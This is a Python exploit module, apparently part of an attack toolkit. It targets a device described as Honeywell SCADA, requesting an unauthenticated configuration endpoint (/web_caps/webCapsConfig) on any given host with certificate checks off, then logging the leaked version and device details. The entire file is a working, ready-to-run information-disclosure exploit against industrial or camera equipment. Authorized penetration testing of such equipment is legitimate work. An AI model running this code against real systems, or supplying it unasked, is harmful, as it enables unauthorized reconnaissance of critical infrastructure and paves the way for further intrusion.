import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 443):
    """
    Exploit Title: Honeywell SCADA - Information Disclosure
    CVE Author: t4rkd3vilz
    Affected Web Version: 3.2.1.294365
    Device Type: IPC-HFW2320R-ZS
    Exploit Type: Info Disclosure via /web_caps/webCapsConfig
    """

    url = f"https://{target}:{port}/web_caps/webCapsConfig"

    try:
        logger.info(f"[*] Attempting to fetch info from: {url}")
        response = requests.get(url, timeout=5, verify=False)

        if response.status_code == 200 and "WebVersion" in response.text and "deviceType" in response.text:
            logger.success("[+] Honeywell SCADA info disclosure successful")
            logger.info(f"[+] Extracted Info Snippet:\n{response.text[:300]}")
            return True
        else:
            logger.warning(f"[-] Endpoint returned status {response.status_code} but no useful data found")
            return False

    except Exception as e:
        logger.error(f"[!] Honeywell infoleak error: {e}")

    return False
